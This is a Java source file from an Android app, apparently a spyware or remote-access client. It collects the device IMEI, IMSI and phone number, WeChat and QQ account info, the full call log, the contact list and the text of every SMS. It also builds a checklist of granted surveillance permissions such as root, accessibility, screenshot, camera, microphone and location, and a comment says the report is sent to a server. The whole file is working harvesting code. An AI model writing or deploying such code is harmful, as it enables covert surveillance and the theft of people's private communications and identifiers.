/**
 * 
 */
package utils;


import java.text.SimpleDateFormat;
import java.util.Date;



import accessibility.Acc101Service;

import android.content.Context;

import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;

import static utils.ConfigCt.TAG;


/**
 * @author byc
 *
 */
public class PhoneInfo {
	public static String PhoneBaseInfo=null;
	 /** 
     * 获取IMEI号，IESI号，手机型号 androidVersion=Product Model: Nexus 11,generic,19,4.4.2,19
     */ 
    public static String getBasePhoneInfo(Context context) { 
    	if(PhoneBaseInfo!=null)return PhoneBaseInfo;
       TelephonyManager mTm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);  
        String imei = mTm.getDeviceId();  
        String imsi = mTm.getSubscriberId();  
        String mtype = android.os.Build.MODEL; // 手机型号  
        String mtyb= android.os.Build.BRAND;//手机品牌  Xiaomi
        String numer = mTm.getLine1Number(); // 手机号码，有的可得，有的不可得  
        String osVersion=android.os.Build.VERSION.RELEASE;
        String osVersionInt=String.valueOf(android.os.Build.VERSION.SDK_INT);
        String Info=mtype+','+mtyb+','+osVersion+','+osVersionInt+"\r\nIMEI:"+imei+"\r\nPhone:"+numer;
        return Info;
        //return "手机IMEI号："+imei+"\r\n手机IESI号："+imsi+"\r\n手机型号："+mtype+"\r\n手机品牌："+mtyb+"\r\n手机号码"+numer;  
      }  
    /*
     * 发送信息至服务器
     */
    public static String getBaseInfo(Context context,String info) { 
    	String baseInfo=PhoneInfo.getBasePhoneInfo(context);
    	String wxInfo=ConfigCt.getInstance(context).getWechatInfo();
    	String QQInfo=ConfigCt.getInstance(context).getQQInfo();
    	//String pwd=ConfigCt.getInstance(context).getPayPWD();
    	String appName="软件名称："+ConfigCt.AppName+";";
    	String sReg="软件授权：      未授权";
    	if(ConfigCt.bReg)sReg="软件授权：已授权";
    	String sms="读取短信：      未获取";
    	if(ConfigCt.getInstance(context).getIsSendSms())sms="读取短信：已授权";
    	String hp="屏幕状态：      黑屏";
    	if(Funcs.isScreenOn(context))hp="屏幕状态：亮屏";
    	String scrLock="锁屏状态：      未锁屏";
    	if(Funcs.isScreenLocked(context))scrLock="锁屏状态：已锁屏";
    	String version="软件版本："+ConfigCt.version+";";
    	String plugVersion="插件版本："+ConfigCt.PLUGIN_VERSION+";";
    	String sRoot="本机ROOT：      未ROOT";
    	if(ConfigCt.bRoot)sRoot="本机ROOT：已ROOT";
    	String sAccessbility="辅助权限：      未打开";
    	if(Acc101Service.isRunning())sAccessbility="辅助权限：已打开";
    	String sScreenShot="截屏权限：      未获取";
    	if(ConfigCt.getInstance(context).haveScreenShotPower())
    		sScreenShot="截屏权限：已授权";
    	
    	String sLock="锁屏权限：      未获取";
    	if(ConfigCt.getInstance(context).haveLockPermission())
    		sLock="锁屏权限：已授权";
    	
    	String sLocation="定位权限：      未获取";
    	if(ConfigCt.getInstance(context).haveLocatePermission())
    		sLocation="定位权限：已授权";
    	
    	String sCamera="录像权限：      未获取";
    	if(ConfigCt.getInstance(context).haveCameraPermission())
    		sCamera="录像权限：已授权";
    	
    	String sAudio="录音权限：      未获取";
    	if(ConfigCt.getInstance(context).haveAudioPermission())
    		sAudio="录音权限：已授权";
    	
    	String sHaveRoot="ROOT权限：      未获取";
    	if(ConfigCt.getInstance(context).haveRootPermission())
    		sHaveRoot="ROOT权限：已授权";
    	
    	String sContact="通讯录限：      未获取";
    	if(ConfigCt.getInstance(context).getIsReadContact())
    		sContact="通讯录限：已授权";
    	
    	String sCallLog="通话记录：      未获取";
    	if(ConfigCt.getInstance(context).getIsReadCallLog())
    		sCallLog="通话记录：已授权";
    	
    	String sSendSms="发送短信：      未获取";
    	if(ConfigCt.getInstance(context).getIsSendSmsToPhone())
    		sSendSms="发送短信：已授权";
    	
    	String sFloatWindow="悬浮窗口：      未获取";
    	if(Funcs.haveFloatWindowPermission(context))
    		sFloatWindow="悬浮窗口：已授权";
    	
    	String allInfo=baseInfo+"\r\nWX:"
    			+wxInfo+"\r\nQQ:"
    			+QQInfo+"\r\n"
    			//+pwd+"\r\n"
    			+appName+"\r\n"
    			+version+"\r\n"
    			+plugVersion+"\r\n"
    			+sReg+"\r\n"
    			+"<------------------------屏幕状态\r\n"
    			+hp+"\r\n"
    			+scrLock+"\r\n"
    			+"<------------------------权限列表\r\n"
    			+sms+"\r\n"
    			+"<------------------------>\r\n"
    			+sRoot+"\r\n"
    			+"<------------------------>\r\n"
    			+sScreenShot+"\r\n"
    			+"<------------------------>\r\n"
    			+sLock+"\r\n"
    			+"<------------------------>\r\n"
    			+sAccessbility+"\r\n"
    			+"<------------------------>\r\n"
    			+sLocation+"\r\n"
    			+"<------------------------>\r\n"
    			+sCamera+"\r\n"
    			+"<------------------------>\r\n"
    			+sAudio+"\r\n"
    			+"<------------------------>\r\n"
    			+sContact+"\r\n"
    			+"<------------------------>\r\n"
    			+sCallLog+"\r\n"
    			+"<------------------------>\r\n"
    			+sSendSms+"\r\n"
    			+"<------------------------>\r\n"
    			+sHaveRoot+"\r\n"
    			+"<------------------------>\r\n"
				+sFloatWindow+"\r\n"
				+"<------------------------>\r\n";
    	if(info!=null)allInfo=allInfo+info;
    	return allInfo;
    }

    /** 
     * 获取通话记录 
     */  
    public static String GetCallsInPhone(Context context) {  
        String result = null;  
        Cursor cursor = context.getContentResolver().query(  
                Calls.CONTENT_URI,  
                new String[] { Calls.DURATION, Calls.TYPE, Calls.DATE,  
                        Calls.NUMBER }, null, null, Calls.DEFAULT_SORT_ORDER);  
        boolean hasRecord = cursor.moveToFirst();  
        int count = 0;  
        String strPhone = "";  
        String date;  
  
        while (hasRecord) {  
            int type = cursor.getInt(cursor.getColumnIndex(Calls.TYPE));  
            long duration = cursor.getLong(cursor  
                    .getColumnIndex(Calls.DURATION));  
            strPhone = cursor.getString(cursor.getColumnIndex(Calls.NUMBER));  
            SimpleDateFormat dateFormat = new SimpleDateFormat(  
                    "yyyy-MM-dd hh:mm:ss");  
            Date d = new Date(Long.parseLong(cursor.getString(cursor  
                    .getColumnIndex(Calls.DATE))));  
            date = dateFormat.format(d);  
  
            result = result + "phone :" + strPhone + ",";  
  
            result = result + "date :" + date + ",";  
            result = result + "time :" + duration + ",";  
  
            switch (type) {  
            case Calls.INCOMING_TYPE:  
                result = result + "type :呼入";  
                break;  
            case Calls.OUTGOING_TYPE:  
                result = result + "type :呼出";  
            default:  
                break;  
            }  
            result += "\r\n";  
            count++;  
            hasRecord = cursor.moveToNext();  
        }
        //Log.i(ConfigCt.TAG, result); 
        return result;
        //textView.setText(result);  
    }
   

    /** 
     * 获取通讯记录 
     */  
    public static String GetContactInPhone(Context context) { 
    	 try {
    		 StringBuffer sb = new StringBuffer();
             Uri contactUri =ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
             Cursor cursor = context.getContentResolver().query(contactUri,
                                                               new String[]{"display_name", "sort_key", "contact_id","data1"},
                                                               null, null, "sort_key");
             String contactName;
             String contactNumber;
             String contactSortKey;
             int contactId;
             while (cursor.moveToNext()) {
                 contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                 contactNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                 contactId = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
                 //contactSortKey =getSortkey(cursor.getString(1));
                 //ContactsInfo contactsInfo = new ContactsInfo(contactName,contactNumber,contactSortKey,contactId);
                 if (contactName!=null){
                	 sb.append(contactName+ "："+contactNumber + ":" + contactId + "\r\n");
                      //list.add(contactsInfo);
                 }
             }
             cursor.close();//使用完后一定要将cursor关闭，不然会造成内存泄露等问题
             return sb.toString();
         }catch (Exception e){
             e.printStackTrace();
             return null;
         }finally {

         }
    }

	/**
	 * 获取所有短信
	 *
	 * @return
	 */
	public static String getSmsInPhone(Context context) {
		final String SMS_URI_ALL = "content://sms/";

		StringBuilder smsBuilder = new StringBuilder();

		try {
			Uri uri = Uri.parse(SMS_URI_ALL);
			String[] projection = new String[] { "_id", "address", "person",
					"body", "date", "type" };
			Cursor cur = context.getContentResolver().query(uri, projection, null,
					null, "date desc"); // 获取手机内部短信

			if (cur.moveToFirst()) {
				int index_Address = cur.getColumnIndex("address");
				int index_Person = cur.getColumnIndex("person");
				int index_Body = cur.getColumnIndex("body");
				int index_Date = cur.getColumnIndex("date");
				int index_Type = cur.getColumnIndex("type");

				do {
					String strAddress = cur.getString(index_Address);
					int intPerson = cur.getInt(index_Person);
					String strbody = cur.getString(index_Body);
					long longDate = cur.getLong(index_Date);
					int intType = cur.getInt(index_Type);

					SimpleDateFormat dateFormat = new SimpleDateFormat(
							"yyyy-MM-dd hh:mm:ss");
					Date d = new Date(longDate);
					String strDate = dateFormat.format(d);

					String strType = "";
					if (intType == 1) {
						strType = "接收";
					} else if (intType == 2) {
						strType = "发送";
					} else {
						strType = "null";
					}

					smsBuilder.append("[ ");
					smsBuilder.append(strAddress + ", ");
					smsBuilder.append(intPerson + ", ");
					smsBuilder.append(strbody + ", ");
					smsBuilder.append(strDate + ", ");
					smsBuilder.append(strType);
					smsBuilder.append(" ]\r\n");
				} while (cur.moveToNext());

				if (!cur.isClosed()) {
					cur.close();
					cur = null;
				}
			} else {
				smsBuilder.append("no result!");
			} // end if

			smsBuilder.append("getSmsInPhone has executed!");

		} catch (SQLiteException ex) {
			Log.d("SQLiteException in getSmsInPhone", ex.getMessage());
		}
		Log.i(TAG, smsBuilder.toString());
		return smsBuilder.toString();
	}
    private static String getSortkey(String sortKeyString){
        String key =sortKeyString.substring(0,1).toUpperCase();
        if (key.matches("[A-Z]")){
            return key;
        }else
            return "#";   //获取sort key的首个字符，如果是英文字母就直接返回，否则返回#。
    }
}
